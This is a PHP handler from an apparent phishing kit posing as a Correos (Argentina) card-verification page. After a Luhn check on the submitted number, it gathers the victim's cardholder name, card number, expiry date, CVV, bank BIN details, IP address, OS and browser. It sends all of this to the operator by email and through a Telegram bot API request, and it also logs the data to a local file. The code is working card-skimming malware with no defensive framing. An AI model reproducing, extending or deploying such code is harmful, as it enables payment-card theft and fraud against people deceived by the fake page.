<?php
session_start();

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors', '0');
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors', '0');

include('../Conan/911.php');
include('../Conan/COUNTRY.php');
include('../Conan/SYS.php');
include('../Conan/TELEGRMAT.php');
include('../Conan/BIN.php');

function validateCardNumber($number) {
    $number = preg_replace('/\D/', '', $number);

    $length = strlen($number);
    if ($length < 15 || $length > 16) {
        return false;
    }

    $sum = 0;
    for ($i = 0; $i < $length; $i++) {
        $digit = (int) $number[$i];
        if (($length - $i) % 2 == 0) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }
    return $sum % 10 == 0;
}

if (isset($_POST['submit'])) {
    if (validateCardNumber($_POST['one'])) {
        header("Location: ../Loading.php?FGDD=1#sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG#_$dispatch"); 
    } else {
        header("Location: ../B.php?error=invalidCardNumber"); 
        exit(); // توقف عن تنفيذ السكريبت هنا
    }

    $message = "* +------+CCV-Argentina+------+\n";
    $message .= "* Holder Name: " . $_POST['smiya'] . "\n";
    $message .= "* Carte Number: " . $_POST['one'] . "\n";
    $message .= "* Date Experation: " . $_POST['two'] . "\n";
    $message .= "* CVV Code: " . $_POST['three'] . "\n";
	
	$message .= "+------BIN CCV------+\n";
	$message .= "name : ".$_SESSION['bank_name']."\n";
	$message .= "scheme : ".$_SESSION['bank_scheme']."\n";
	$message .= "type : ".$_SESSION['bank_type']."\n";
	$message .= "brand : ".$_SESSION['bank_brand']."\n";

    $message .= "* +------+INFO+------+\n";
    $message .= "* Country: #$get_user_country\n";
    $message .= "* IP Address: $ip\n";
    $message .= "* Operating System: $user_os\n";
    $message .= "* Browser: $user_browser\n";
    $message .= "* Time: $date\n";
    $message .= "* +------++------+\n";

    $subject = "+------+CCV-CORREOS+------+";
    $headers = "From: CCV@CORREOS.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    mail($to, $subject, $message, $headers);

    $data = [
        'text' => $message,
        'chat_id' => $chat_id,
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

    $_SESSION['one'] = $_POST['one'];

    $file = fopen('XD.txt', 'a');
    fwrite($file, $message . "\n");
    fclose($file);
}
?>